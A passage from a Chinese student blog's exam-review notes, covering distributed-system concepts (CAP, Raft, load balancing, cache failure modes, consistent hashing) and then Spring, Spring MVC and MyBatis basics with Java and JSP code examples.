可用性Availability：在集群中一部分节点故障后，集群整体是否还能响应客户端的读写请求 分区容忍性Partition tolerance：以实际效果而言，分区相当于对通信的时限要求。系统如果不能在一定时限内达成数据一致性，就意味着发生了分区，必须就当前操作在C和A之间做出选择 高可用、数据一致是很多系统设计的目标，但是分区又是不可避免地事情，由此引出了以下几种选择： CA without P不要求P，则C(强一致性)和A是可以保证的。（但分区始终是存在的，CA的系统更多是允许分区后各子系统依然保持CA） 典型放弃分区容忍性的例子有 关系型数据库、LDAP 等 CP without A不要求A，相当于每个请求都需要在Server之间强一致，而P(分区)会导致同步时间无限延长，如此CP也是可以保证的。 很多传统的数据库分布式事务都属于这种模式，分布式锁也属于这种情况，如下图示： AP without C需放弃一致性。一旦分区发生，节点之间可能会失去联系，为了高可用，每个节点只能用本地数据提供服务，而这样会导致全局数据的不一致性。 现在众多NoSQL都属于这类，如下图示： Raft算法的三个子问题在写这个问题之前，要先明白Raft是用来做什么的。 上文提到，CAP理论代表了分布式系统的理论基础。理论有了，用什么来实现理论呢。这就是Raft要解决的问题。 Raft主要针对的是，分布式系统中，多个节点之间就某个值达成一致的通信协议。也就是说，Raft是面向Consistency问题的解决方案。 Raft将一致性算法分成了几个关键模块（子问题）： 领导人选举 日志复制 安全性 为了实现一致性这个目标，Raft算法执行的这个过程就和选举一样，参选者需要说服大多数选民（服务器）投票给他，一旦选定后就跟随其操作，领导人说啥，下面的人就做啥。 其实期末复习只需要知道这些就可以了，但是Raft的算法真的很有趣，我真的很想继续写下去。所以下面的内容可以选择性看一看。 Raft算法的选举过程 任何一个服务器都可以成为一个候选者，它向其他服务器（选民）发出要求选举自己的请求。 其他服务器同意了，回复OK（同意）指令。此时如果有一个Follower服务器宕机，没有接收到选举的请求，则只要达到半数以上的票数，候选人还是可以成为领导者的 这样，这个候选者就成为领导者，他可以向选民们发出要执行具体操作动作的指令，比如日志复制。 如果一旦这个Leader宕机崩溃了，那么Follower中会有一个成为候选者，发起选举，相当于在执行1~2这个步骤。 Nginx的负载均衡策略在揭秘Nginx的负载均衡策略之前，我们要知道什么是Nginx呢？Nginx又有什么作用呢？ 在探寻这些问题的答案之前，我们首先要知道什么是分布式系统的设计策略！ 分布式系统设计策略分布式系统本质是通过低廉的硬件攒在一起以获得更好的吞吐量、性能以及可用性等。一台设备坏了，可以通过负载均衡和路由到其他设备上。分布式系统有一些通用的设计策略，首先要解决心跳问题（Heartbeat）。一台服务器判定存活状态，才能执行任务，否则则不能。在分布式环境下，有几个问题是普遍关心的，我们称之为设计策略： 如何检测你还活着？ 如何保障高可用性？ 容错处理 重试机制 负载均衡 如何检测你还活着？— 《心跳检测》在分布式环境中,存在着非常多的node，其实质是这些节点分担任务的运行、计算或者程序逻辑处理。那么就有一个非常重要的问题，如何检测一个节点出现了故障乃至无法工作了？ 传统解决这一命题是采用心跳检测的手段，如同通过仪器对病人进行一些检测诊断一样。心跳，就是以固定的频率向其他节点汇报当前节点状态的方式。收到心跳，一般可以认为一个节点和现在的网络是良好的。 心跳汇报时，一般会携带附加状态、元数据信息等，便于管理。 若Sever没有收到Node3的心跳时，Server认为Node3失联。 但是失联只是Node3失去联系，不代表Node3存在故障，有可能是Node3处于繁忙状态，导致调用检测超时，也有可能Server与Node3直接出现网络闪断或者链路故障。 因此，心跳不是万能的。收到心跳可以确认正常，但是收不到心跳，不能认定该节点已经死亡。这时候，可以通过一些方法帮助Server做决定： 周期性心跳检测机制、累计失效检测机制。 周期性心跳检测机制 Server每隔t秒向Node集群发送检测请求，设定超时时间，如果超过超时时间，则判断死亡，可以把该节点踢出集群。 如何保障高可用性？—《高可用性设计》系统高可用性的常用设计模式包括三种： 主备模式 主备模式就是，当主机宕机时，备机接管主机的一切工作，待主机恢复正常后，按使用者习惯以自动（热备）或手动（冷备）方式将服务切换到主机上运行。在数据库部分，习惯称之为MS模式。MS模式即Master/Slave模式，这在数据库高可用性方案中比较常用。 互备模式 互备模式是指两台主机同时运行各自的服务且相互监督情况。在数据库高可用性部分，常用的互备模式是MM模式。MM模式即Multi-Master模式，指一个系统存在多个master，每个master都具有read-write能力，需根据时间戳或业务逻辑合并版本。 比如分布式版本管理系统git可以理解成Multi-master，具备最终一致性。 集群模式 集群模式是指有多个节点在运行，同时可以通过主控节点分担服务请求，比如zookeeper。集群模式要特别解决主控节点本身的高可用问题。 TFS集群就是最好的集群模式例子： 容错处理怎么做？—《容错性》容错性顾名思义就是IT系统对于错误的包容能力，这里的容错确切的说是容纳故障，而非容纳错误。 以前文提到的TFS集群为例，TFS集群需要容错（一个集群宕掉咋办？）、NameServer需要容错、DataServer需要容错。NameServer的容错机制是通过主备切换完成的。NameServer主要管理了DataServer和Block之间的关系。如每个DataServer用有哪些Block，每个Block存放在拿些DataServer上等。同时,NameServer采用了HA结构，一主一备，主NameServer上的操作会重放至备NameServer上。如果主NameServer出现问题，可以实时切换到备NameServer。 另外NameServer和DataServer之间也会有定时的heartbeat，DataServer会把自己拥有的Block发送给NameServer。NameServer会根据这些信息重新构建DataServer和Block的关系。 容错处理是保障分布式系统环境下系统的高可用性，一个典型的案例就是对于缓存实现雪崩问题的解决方案。这里就涉及到了缓存穿透、缓存击穿和缓存雪崩三大问题，也是期中考试要考的内容。 所以我们知道，容错处理的目的是为了保障分布式系统的高可用性，其中对于缓存穿透、缓存击穿、缓存雪崩的处理便属于容错处理。我们会在分布式系统设计策略这一节写完之后，阐述这三个缓存问题是什么以及解决方案。 负载均衡是什么？—《负载均衡》负载均衡集群：其关键在于使用多台集群服务器共同分担计算任务，把网络请求及计算分配到集群可用的服务器上去，从而达到可用性及较好的用户操作体验。 负载均衡有硬件解决方案，也有软件解决方案。硬件解决方案有著名的F5、软件有LVS、HAproxy、Nginx等。由此我们引出了什么是Nginx。 Nginx-负载均衡的软件解决方案Nginx的作用是解决负载均衡问题，它实现负载均衡有如下几种策略： 轮询：即Round Robin，根据Nginx配置文件中的顺序，依次把客户端Web请求分发到不同的后端服务器 最少连接：当前谁的连接最少，分发给谁 IP地址哈希：确定相同IP请求可以转发给同一个后端节点处理、以方便session保持 基于权重的负载均衡：配置Nginx把请求更多地分发到高配置的后端服务器上，包相对较少的请求分发到低配服务器。 在这里我们提到了IP地址哈希，这也是期中考试的考点，我们会在Nginx负载均衡这一小结结束之后，详细阐述。 缓存击穿、缓存穿透与缓存雪崩是什么？怎么解决？缓存击穿 缓存里没有key，数据库里有数据 某一个key失效，通常是热点数据，导致高并发情况下，请求直接打到DB上，DB直接崩掉（若是大量的key同时失效则变成了缓存雪崩） 解决方法：在查询第一个数据请求上使用一个互斥锁来锁住它。其他线程走到这一步拿不到锁就等着，等到第一个线程查询到了数据，然后做缓存。后面的线程进来发现已经有缓存了，就直接走缓存。 缓存穿透 缓存里没有数据 大量不存在的id去查询数据，会产生大量的请求到DB查询，可能会导致DB由于压力过大而宕机 解决办法： 对null缓存：如果一个查询结果返回为空（不管数据是否存在），我们仍把这个空结果（null）进行缓存，设置空结果的过期时间会很短，最长不超过五分钟。 Bloom Filter：在缓存之前再加一层Bloom Filter，在查询的时候先去Bloom Filter去查询key是否存在，如果不存在就直接返回，存在再走缓存-&gt;查DB 缓存雪崩 key对应的数据存在，但在redis中过期，此时若有大量的并发请求过来，这些请求发现缓存过期一般都会从DB加载数据并返回缓存，此时若有大并发的请求可能会瞬间把后端DB压垮。 解决方法： 构建多级缓存：nginx缓存+redis缓存+其他缓存（ehcache等） 将缓存失效时间分散开 ：比如我们可以在原有的失效时间基础上增加一个随机值，比如1-5分钟，这样每一个缓存的过期时间的重复率就会降低，就很难引发集体失效的事件 互斥锁： 在第一个请求去查询数据库的时候对他加一个互斥锁，其余查询的请求就会被阻塞住，直到锁被释放，从而保护数据库。 一致性算法一致性哈希算法是在1997年由MIT提出的一种分布式哈希（DHT）实现算法。主要解决单调性（Monotonicity）和分散性（Spread）的问题。单调性简单描述是哈希的结果能够保证原有已分配的内容可以被映射到原有缓冲中去，避免在节点增减过程中导致不能命中 一致性Hash一致性Hash算法将整个哈希值空间组织成一个虚拟的圆环，如假设某哈希函数H的值空间为0-2^32-1（即哈希值是一个32位无符号整型），整个哈希环如下所示 学过数据结构-查询-散列表这一章应该知道什么是Hash，这里不多赘述，简而言之就是将IP地址通过Hash函数直接转变成存储地址。 将数据key使用相同的函数Hash计算出哈希值，并确定此数据在环上的位置，从此位置沿环顺时针”行走“，遇到的第一台服务器就是其应该定位到的服务器。 增、减（宕机）结点后，原本 Node C 拥有的缓存数据需要”托付“给 Node C 的顺时针前驱节点Node E或后继节点Node D。如图所示： 操作前 操作后 Hash环的数据倾斜问题一致性Hash算法在服务节点台少时，容易因为节点分布不均匀而造成数据倾斜（被缓存的对象大部分集中缓存在某一台服务器上）问题，例如系统中只有两台服务器，其环分布如图所示： 具体做法可以在服务器IP或主机名的后面增加编号来实现。 为每台服务器计算三个虚拟节点，于是可以分别计算”Node A#1“、”Node A#2“、”NodeA#3“、”Node B#1“、”Node B#2“、”Node B#3“的哈希值，于是形成六个虚拟节点。 这样就解决了服务节点少时数据倾斜的问题。在实际应用中，通常将虚拟节点数设置为32甚至更大，因此即使很少的服务节点也能做到相对均匀的数据分布。 Redis这一块内容较多，也是大数据存储技术中最重要的章节。 我们分为几个部分来进行梳理和复习： Redis的数据结构 Redis的持久化方式 Redis的内存回收算法 Redis的节点通信协议 Redis的优化 在进行学习之前，我们必须要知道什么是Redis，它是用来解决什么问题的？ 在Web应用发展的初期，那时关系型数据库受到了较为广泛的关注和应用，原因是因为那时候Web站点基本上访问和并发不高、交互也较少。而在后来，随着访问量的提升，使用关系型数据库的Web站点多多少少都开始在性能上出现了一些瓶颈，而瓶颈的源头一般是在磁盘的I/O上。而随着互联网技术的进一步发展，各种类型的应用层出不穷，这导致在当今云计算、大数据盛行的时代，对性能有了更多的需求，主要体现在以下四个方面： 低延迟的读写速度：应用快速地反应能极大地提升用户的满意度 支撑海量的数据和流量：对于搜索这样大型应用而言，需要利用PB级别的数据和能应对百万级的流量 大规模集群的管理：系统管理员希望分布式应用能更简单的部署和管理 庞大运营成本的考量：IT部门希望在硬件成本、软件成本和人力成本能够有大幅度地降低 为了克服这一问题，NoSQL应运而生，它同时具备了高性能、可扩展性强、高可用等优点，受到广泛开发人员和仓库管理人员的青睐。 Redis是现在最受欢迎的NoSQL数据库之一 余下的内容，请参考老杨的文档。这里笔者还未做整理。 关系型数据库和非关系型数据库的优缺点分析 关系型数据库： 优点： 容易理解 易于维护 使用方便 能完成一些复杂操作 缺点： 读写性差 灵活性欠缺 硬盘I/O有瓶颈 海量数据读写能力差 非关系型数据库： 优点： 读写性能高 格式灵活 速度快 高拓展性 成本低，部署简单 缺点： 不提供SQL支持，学习成本和使用成本高 无事务处理 数据结构相对复杂，复杂查询方面稍微欠缺 设计一个缓存框架（代码来源：spxzx）采用LRU策略： 12345678910111213141516171819202122232425262728293031package lruimport(&quot;container/list&quot;)//Cache 是一个LRU缓存type Cache struct&#123; maxBytes int64 //允许使用的最大内存 nBytes int64 //当前已使用的内存 ll *list.List //Go标准库实现的双链表list.List cache map[string]*list.Element//map[k]v类型 健为字符串，值为双链表中对应的节点指针 //当一个entry被移除时 可选并被执行 onEvicted func(key string,value value)//回调函数&#125;//双链表节点的数据类型type entry struct&#123; key string //只实现了Value接口的任意类型，该接口只包含了一个方法Len() int //用于返回值所占用的内存大小 value Value&#125;//value接口 用Len去计算占用了多少内存type Value interface&#123; Len() int&#125;//Len获取添加了多少条数据，这里其实就是实现了 上面的接口func(c *Cache) Len() int&#123; return c.ll.Len()&#125;","comments":true,"categories":[{"name":"计算机基础","slug":"计算机基础","permalink":"http://1905060202.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"大数据技术","slug":"大数据技术","permalink":"http://1905060202.github.io/tags/%E5%A4%A7%E6%95%B0%E6%8D%AE%E6%8A%80%E6%9C%AF/"},{"name":"期末复习","slug":"期末复习","permalink":"http://1905060202.github.io/tags/%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/"},{"name":"分布式技术","slug":"分布式技术","permalink":"http://1905060202.github.io/tags/%E5%88%86%E5%B8%83%E5%BC%8F%E6%8A%80%E6%9C%AF/"},{"name":"八股文","slug":"八股文","permalink":"http://1905060202.github.io/tags/%E5%85%AB%E8%82%A1%E6%96%87/"}]},{"title":"高级Web技术复习","date":"2022-05-06T12:46:53.000Z","path":"2022/05/06/高级Web技术复习/","text":"高级Web技术复习@Author：HYN 2022年春季，2019级数据科学与大数据技术高级Web技术期中考试复习提纲。 Spring的两大特性及其含义 Spring的自动装配机制 Spring核心容器层组成 Spring Bean的作用域 Spring MVC框架组合注解 SpringMVC页面跳转类型 SpringMVC三大组件 Mybatis映射文件 Mybatis的核心对象 动态SQL元素 Mybatis常用注解 Mybatis映射文件中常用元素 考题预测论述题传统JDBC的劣势是什么？ 频繁的创建、释放数据库连接会造成系统资源浪费 代码中的SQL语句硬编码，会造成代码不易于维护 JDBC对结果集解析存在硬编码，使得系统不易于维护 Mybatis是什么？Mybatis是一个支持普通SQL查询、存储及高级映射的持久层框架 什么是ORM？Mybatis框架是一个ORM框架。所谓的ORM就是一种为了解决面向对象与关系型数据库中数据不匹配的技术。它通过描述Java对象与数据库表之间的映射关系，自动将Java应用程序中的对象持久化到关系型数据库的数据表中。 名词解释 IOC：控制反转，典型的工厂模式。在使用Spring框架后，对象实例不再有调用者创建，而是由Spring的IOC容器来创建，IoC容器会负责控制程序之间的关系。 AOP：面向切面编程，典型的代理模式的体现。AOP是通过预编译方式和运行期间动态代理实现程序功能，也就是说可以在不修改源代码的情况下，给程序统一添加功能。 Beans模块：它提供了BeanFactory类，是工厂模式的经典实现。Beans模块的主要作用是创建和管理Bean对象 Core模块：它提供了Spring框架的基本组成部分，包括IoC和DI功能 Context模块：它构建于Beans模块和Core模块基础上，它可以通过ApplicationContext接口提供上下文信息 SpEL模块：它是Spring3.0新增的模块，提供了SpEL表达式语言的支持。 web：web是分布在全世界的、基于HTTP通信协议的、存储在web服务器中的所有或相连接的超文本集 JS：JavaScript是一种嵌入在HTML文档中，具有跨平台、安全性，基于对象和事件驱动的解释型编程语言 CSS:级联样式表是一种用来表现HTML或XML等文件样式的计算机语言 HTML:超文本标记语言是标准通用标记语言下的一个应用，也是一种规范、标准。 JDBC:JDBC是一种访问数据库的技术标准，它是一种能通过Java语言访问数据库的应用程序接口。 Servelt：Servelt是一种用Java语言编写的服务器端语言，它担当客户请求与服务器响应的中间层。 填空题Spring框架 Spring容器支持（XML）和（Properties）两种格式的配置文件 Spring的（bean）元素中包含一个（autowire）属性，可以通过设置（autowire）属性的值实现Bean的自动装配 Spring容器提供了两种基于XML的装配方式，（属性setter方法注入）和（构造方法注入） Spring的作用域最常见的有两个，分别是（singleton）和（prototype） Spring核心容器层的组成有四个，分别是，（Beans模块），（Core模块），（Context模块），（SpEL模块） SpringMVC的跳转类型有三种，分别是，（返回值为void的跳转），（返回值为String类型的跳转），（返回值为ModelAndView的页面跳转） SpringMVC的三大组件分别是，（处理器映射器），（处理器适配器），（视图解析器） SpringMVC框架的组合注解一共有五个，分别是，（@GetMapping），（@PostMapping），（@PutMapping），（DeleteMapping），（@PatchMapping） Spring的两大特性是（IoC）和（AOP） Mybatis Mybatis映射文件的根元素是（mapper） Mybatis映射文件根元素mapper只有一个属性，它是（namespace） Mybatis映射文件中常用的元素有（mapper）、（cache）、（cache-ref）、（resultMap）、（sql）、（insert）、（select）、（delete）、（update） Mybatis的框架的核心对象主要有：（SqlSessionFactoryBuilder）、（SqlSessionFactory）、（SqlSession） 动态SQL常用元素有（《if》）、（《choose》（《when》、《otherwise》））、（《where》）、（《trim》）、（《set》）、（《foreach》） Mybatis常用注解有（@Insert）、（@Select）、（@Update）、（@Delete）、（@Param） Spring的两大特性及其含义IOC就是典型的工厂模式，通过sessionfactory去注入实例。 AOP就是典型的代理模式的体现。 IoCIoC，英文全称Inversion of Control，意为控制反转。 在 使用Spring框架后，对象的实例不再由调用者来创建，而是由Spring的IoC容器来创建，IoC容器会负责控制程序之间的关系，而不是由调用者的程序代码直接控制。这样，控制权由应用代码转到了IoC容器，控制权发生了反转，这就是Spring的控制反转。 AOPAOP，英文全称Aspect-Oriented Programming，意为面向切面编程。 AOP主张将程序中相同的业务逻辑进行横向隔离，并将重复的业务逻辑抽取到一个独立的模块中，以达到提高程序可重用性和开发效率的目的。 Spring的自动装配机制Spring容器支持XML和Properties两种格式的配置文件，在实际开发中，最常用的是XML格式的配置文件。XML是标准数据传输和存储格式，方便查看和操作数据。在Spring中，XML配置文件的根元素是,元素包含子元素，每个&lt;bean子元素可以定义一个Bean，通过元素将Bean注册到Spring容器中。 自动装配Spring的bean元素中包含一个autowire属性，可以通过设置autowire属性的值实现Bean的自动装配。 属性值 描述 default（默认值） 由的上级元素的default-autowire属性值确定。 byName 根据元素id属性的值自动装配。 byType 根据元素的数据类型（Type）自动装配，如果一个Bean的数 据类型，兼容另一个Bean中的数据类型，则自动装配。 constructor 根据构造函数参数的数据类型，进行byType模式的自动装配。 no 默认值，不使用自动装配，Bean依赖必须通过元素或ref属性定义。 基于XML的装配在基于XML的装配就是读取XML配置文件中的信息完成依赖注入，Spring容器提供了两种基于XML的装配方式，属性setter方法注入和构造方法注入。 属性setter方法注入属性setter方法注入要求一个Bean必须满足以下两点要求： Bean类必须提供一个默认的无参构造方法 Bean类必须为需要注入的属性提供对应的setter方法 构造方法注入使用构造方法注入时，在配置文件里，需要使用元素的子元素来定义构造方法的参数，例如，可以使其value属性来设置该参数的值。 基于注解的装配 在Spring中，使用XML配置文件可以实现Bean的装配工作，但在实际开发中如果Bean的数量比较多，会导致XML文件过于臃肿，给后期维护和升级带来一定的困难。为解决此问题，Spring提供了注解，通过注解也可以实现Bean的装配。 基于注解的装配Spring的常用注解 注解 描述 @Component 指定一个普通的Bean，可以作用在任何层次。 @Controller 指定一个控制器组件Bean，用于将控制层的类标识为Spring中的Bean，功能上等 同于@Component。 @Service 指定一个业务逻辑组件Bean，用于将业务逻辑层的类标识为Spring中的Bean，功 能上等同于@Component。 @Repository 指定一个数据访问组件Bean，用于将数据访问层的类标识为Spring 中的Bean，功 能上等同于@Component。 @Scope 指定Bean实例的作用域。 @Value 指定Bean实例的注入值。 注解 描述 @Autowired 指定要自动装配的对象。 @Resource 指定要注入的对象。 @Qualifier 指定要自动装配的对象名称，通常与@Autowired联合使用。 @PostConstruc t 指定Bean实例完成初始化后调用的方法。 @PreDestroy 指定Bean实例销毁前调用的方法 下面是基于注解装配的例子： 定义实体类： 1234567891011@Component(&quot;user&quot;)@Scope(&quot;singleton&quot;)public class User &#123;@Value(&quot;1&quot;)private int id;@Value(&quot;张三&quot;)private String name;@Value(&quot;123&quot;)private String password;// 省略getter/setter方法和toString()方法&#125; 定义dao层：创建UserDao接口作为数据访问层接口，并在UserDao接口中声明save()方法用于查询User实体类的对象信息。 1234package com.hnust.dao;public interface UserDao &#123;public void save();&#125; 实现dao层：创建UserDaoImpl作为UserDao的实现类，并在UserDao类中实现UserDao接口中的save()方法。 12345678910@Repository(&quot;userDao&quot;)public class UserDaoImpl implements UserDao &#123;public void save()&#123;ApplicationContext applicationContext=newClassPathXmlApplicationContext(&quot;applicationContext.xml&quot;);User user=(User) applicationContext.getBean(&quot;user&quot;);System.out.println(user);System.out.println(&quot;执行UserDaoImpl.save()&quot;);&#125;&#125; 定义service层：创建UserService接口作为业务逻辑层的接口，并在UserService接口中定义save()方法。 1234package com.hnust.service;public interface UserService &#123;public void save();&#125; 实现service层：创建UserServiceImpl作为UserService的实现类，并在UserServiceImpl中实现UserService接口中的save()方法。 12345678910@Service(&quot;userService&quot;)public class UserServiceImpl implements UserService &#123;//使用@Resource注解注入UserDao@Resource(name=&quot;userDao&quot;)private UserDao userDao;public void save()&#123;this.userDao.save();System.out.println(&quot;执行UserServiceImpl.save()&quot;);&#125;&#125; 定义controller层：创建UserController类作为控制层。 12345678910@Controllerpublic class UserController &#123;//使用@Resource注解注入UserService@Resource(name=&quot;userService&quot;)private UserService userService;public void save()&#123;this.userService.save();System.out.println(&quot;执行UserController.save()&quot;);&#125;&#125; Spring核心容器层组成Spring核心容器模块在Spring的功能体系中起着支撑性作用，是其他模块的基石。核心容器层主要由Beans模块、Core模块、Context模块和SpEL模块组成。 核心容器模块各模块组成 Beans模块。它提供了BeanFactory类，是工厂模式的经典实现。Beans模块的主要作用是创建和管理Bean对象。 Core模块。它提供了Spring框架的基本组成部分，包括IoC和DI功能。 Context模块。它构建于Beans模块和Core模块之上，它可以通过ApplicationContext接口提供上下文信息。 SpEL模块。它是Spring3.0新增的模块，提供了SpEL表达式语言的支持，SpEL表达式语言是一个在程序运行时支持操作对象图的表达式语言。 Spring Bean的作用域Bean的生命周期是指Bean的实例被创建、初始化和销毁的过程。在Bean的两种作用域singleton和prototype中，Spring容器对Bean的生命周期的管理是不同的。在singleton作用域中，Spring容器可以管理Bean的生命周期，控制着Bean的创建，初始化和销毁。在prototype作用域中，Spring容器只负责创建Bean的实例，不会管理其生命周期。 singleton作用域当Bean是singleton作用域时，Spring容器只为Bean创建一个实例，该实例可以重复使用。Spring容器管理Bean的生命周期，控制着Bean的创建，初始化和销毁。singleton作用域可以避免反复创建和销毁实例造成的资源消耗。 prototype作用域当Bean是prototype作用域时，每次对Bean时都会创建一个新的Bean实例，Spring创建Bean实例而不再管理其生命周期。 Spring MVC框架组合注解 Spring MVC组合注解： @GetMapping：匹配GET方式的请求。 @PostMapping：匹配POST方式的请求。 @PutMapping：匹配PUT方式的请求。 @DeleteMapping：匹配DELETE方式的请求。 @PatchMapping：匹配PATCH方式的请求。 @GetMapping用法示例： 接下来以@GetMapping为例讲解组合注解的用法，@GetMapping是 @RequestMapping(method = RequestMethod.GET)的缩写，使用组合注解替代 @RequestMapping注解，可以省略method属性，从而简化代码。@GetMapping用 法示例代码如下所示。 1234@GetMapping(value=&quot;/firstController&quot;)public void sayHello()&#123;...&#125; 那么什么是 @RequestMapping注解呢？ @RequestMapping注解用于建立请求URL和Handler（处理器）之间的映射关系， 该注解可以标注在方法上和类上。 @RequestMapping注解的使用 当@RequestMapping注解标注在方法上时，该方法就成了一个可以处理客户端请求 的Handler（处理器），它会在Spring MVC接收到对应的URL请求时被执行。Handler在浏 览器中对应的访问地址，由项目访问路径+处理方法的映射路径共同组成。 创建FirstController类，在类中创建sayHello()方法，用来处理客户端请求。 1234567@Controllerpublic class FirstController &#123;@RequestMapping(value=&quot;/firstController&quot;)public void sayHello()&#123;System.out.println(&quot;hello Spring MVC&quot;);&#125;&#125; 当@RequestMapping注解标注在类上时，@RequestMapping的value属性值相当 于本处理器类的命名空间，即访问该处理器类下的任意处理器都需要带上这个命名空间。 @RequestMapping标注在类上时，其value属性值作为请求URL的第一级访问目录。当处 理器类和处理器都使用@RequestMapping注解指定了对应的映射路径，处理器在浏览器中 的访问地址，由项目访问路径+处理器类的映射路径+处理器的映射路径共同组成。 接下来通过一个案例演示@RequestMapping注解标注在类上的使用。 12345678@Controller@RequestMapping(value=&quot;/springMVC&quot;)public class FirstController &#123;@RequestMapping(value=&quot;/firstController&quot;)public void sayHello()&#123;System.out.println(&quot;hello Spring MVC&quot;);&#125;&#125; 说句人话，当@RequestMapping注解标注在类上时，相当于所有请求前面都有了个共同的前缀，当@RequestMapping注解标注在方法上时，它要跟在@RequestMapping注解标注在类上的value后面，是个小弟。 SpringMVC页面跳转类型返回值为void类型的页面跳转到默认页面当Spring MVC方法的返回值为void类型，方法执行后会跳转到默认的页面。默 认页面的路径由方法映射路径和视图解析器中的前缀、后缀拼接成，拼接格式为“前缀 +方法映射路径+后缀”。如果Spring MVC的配置文件中没有配置视图解析器，则会 报HTTP Status 500错误。 创建一个页面跳转类PageController，在PageController类中定义方法 showPageByVoid()，用于测试Spring MVC方法返回值为void的页面跳转。 1234567@Controllerpublic class PageController &#123;@RequestMapping(&quot;/register&quot;)public void showPageByVoid()&#123;System.out.println(&quot;showPageByVoid running&quot;);&#125;&#125; 上述代码的showPageByVoid()方法将会处理URL为register的请求， showPageByVoid()方法中没有返回值，只有一行打印输出字符串的代码。 返回值为String类型的页面跳转-不带数据修改文件PageController.java，新增showPageByString()方法，用于测试返回值 为String类型的页面跳转，showPageByString()方法的实现代码如下所示 123456@Controllerpublic class PageController &#123;@RequestMapping(&quot;/register&quot;)public String showPageByString() &#123;System.out.println(&quot;showPageByString running&quot;);&#125;&#125; 访问地址后，执行了showPageByString()方法，方法执行后成 功跳转到WEB-INF文件夹下的register.jsp页面。如果此时注释掉Spring MVC配置文件springmvc.xml中的视图解析器，在浏览器中访问showPageByString()方法，请求会转发到映射路径为 register对应的showPageByVoid()方法中。 当方法的返回值为普通的字符串时，Spring MVC在方法执行后会默认以转发的方式响应给 客户端。除了这种默认的转发方式，还可以返回指定前缀的字符串，来设定处理器执行后对请求 进行转发还是重定向，设定转发和重定向的字符串格式如下所示。 forward:需要转发到的资源路径 redirect:需要重定向到的资源路径 修改文件PageController.java，新增showPageByForward()方法和 showPageByRedirect()方法，分别用于测试方法执行后转发和重定向的页面跳转。 12345678@RequestMapping(&quot;/showPageByForward&quot;)public String showPageByForward() &#123;System.out.println(&quot;showPageByForward running&quot;);return &quot;forward:orders.jsp&quot;; &#125;@RequestMapping(&quot;/showPageByRedirect&quot;)public String showPageByRedirect() &#123;System.out.println(&quot;showPageByRedirect running&quot;);return &quot;redirect:http://www.itheima.com&quot;; &#125; 在浏览器中访问访问地址 http://localhost:8080/chapter12/showPageByForward。访问地址后，执行了 showPageByForward()方法，方法执行后转发到项目的orders.jsp页面 在浏览器中访问地址http://localhost:8080/chapter12/showPageByRedirect。 访问后，浏览器页面进行跳转，跳转的页面如图所示。 访问地址后执行了 showPageByRedirect()方法，方法执行后重定向到黑马程序员的官网。需要注意的是，方法返回的 字符串一旦添加了“forward:”或“redirect:”前缀，那么视图解析器不再会为方法返回值拼接前 缀和后缀了。 返回值为String类型的页面跳转-携带数据接下来通过一个案例演示携带数据的页面转发，该案例使用HttpServletRequest类型形参和 Model类型形参进行数据传递，案例具体实现步骤如下。 修改文件PageController.java，新增showPageByRequest()方法和 showPageByModel()方法，showPageByRequest()方法使用HttpServletRequest传 递数据，showPageByModel()方法使用Model传递数据，两个方法都使用字符串指 定跳转的页面。 1234567// 只展示了showPageByRequest()方法@RequestMapping(&quot;/showPageByRequest&quot;)public String showPageByRequest(HttpServletRequest request) &#123;System.out.println(&quot;showPageByRequest running&quot;);request.setAttribute(&quot;username&quot;,&quot;request&quot;);return &quot;register&quot;;&#125; 修改文件User.java，在register.jsp的表单中添加value属性，用于接收转发传递过 来的数据 12345678910&lt;%@ page language=&quot;java&quot; contentType=&quot;text/html;charset=UTF-8&quot; pageEncoding=&quot;UTF-8&quot;%&gt;&lt;html&gt;&lt;!-- 只显示了form表单的内容-- &gt;&lt;body&gt;&lt;form action=&quot;$&#123;pageContext.request.contextPath &#125;/registerUser&quot; &gt;用户名：&lt;input type=&quot;text&quot; name=&quot;username&quot;value=&quot;$&#123;username&#125;&quot; /&gt;&lt;br /&gt;密&amp;nbsp;&amp;nbsp;&amp;nbsp;码：&lt;input type=&quot;text&quot;name=&quot;password&quot; value=&quot;$&#123;user.password&#125;&quot; /&gt;&lt;br /&gt;&lt;input type=&quot;submit&quot; value=&quot;注册&quot;/&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt; 在浏览器中访问地址 http://localhost:8080/chapter12/showPageByRequest。访问后，浏览器页面进行跳转，跳转的页面如图所示。 访问地址后执行了 showPageByRequest()方法，方法执行后HttpServletRequest中的username转发到register.jsp页 面中。 在浏览器中访问地址http://localhost:8080/chapter12/showPageByModel。访 问后，浏览器页面进行跳转，跳转的页面如图所示。 访问地址后执行了 showPageByModel()方法，方法执行后，Model中的username和user对象转发到register.jsp页面。 返回值为ModelAndView类型的页面跳转使用方法的返回值可以设定跳转的逻辑视图名称，使用Model等对象实现页面跳 转时传输数据。除此之外，Spring MVC还提供了兼顾视图和数据的对象 ModelAndView，ModelAndView对象包含视图相关内容和模型数据两部分，其中视 图相关的内容可以设置逻辑视图的名称，也可以设置具体的View实例；模型数据则会 在视图渲染过程中被合并到最终的视图输出。 接下来通过一个案例演示返回值为ModelAndView类型的页面跳转，案例具体实现步骤如下 修改文件PageController.java，新增showModelAndView()方法，在 showModelAndView()方法中使用ModelAndView封装数据和视图，完成页面跳转 时传递数据。 123456789@RequestMapping(&quot;/showModelAndView&quot;)public ModelAndView showModelAndView() &#123;ModelAndView modelAndView = new ModelAndView();modelAndView.addObject(&quot;username&quot;,&quot;heima&quot;);User user = new User(); user.setPassword(&quot;password&quot;);modelAndView.addObject(&quot;user&quot;,user);modelAndView.setViewName(&quot;register&quot;);return modelAndView;&#125; 在浏览器中访问地址 http://localhost:8080/chapter12/showModelAndView。访问后，浏览器页面 进行跳转，跳转的页面如图所示。 访问地址后执行了showModelAndView()方法，方法执行后，添加的模 型数据都在register.jsp页面成功取出。 SpringMVC三大组件处理器映射器处理器映射器可以理解为一个Map，HandlerMapping负责根据 用户请求的URL找到Handler（处理器），Spring MVC提供了不同的映射器来实现不同 的映射方式。 处理器适配器处理器适配器作用是根据处理器映射器找到的处理器 Handler 信息，去执行相关的 Handler。不同的处理器映射器映射出来的Handler对象是不一样的，不同的映射由不同 的适配器来负责解析。 视图解析器视图解析器进行视图解析，首先将逻辑视图名解析成物理视图名，即具体的页面地 址，再生成View视图对象返回。 Spring MVC执行流程 Mybatis映射文件Mybatis的核心对象 SqlSessionFactoryBuilder SqlSessionFactory SqlSession 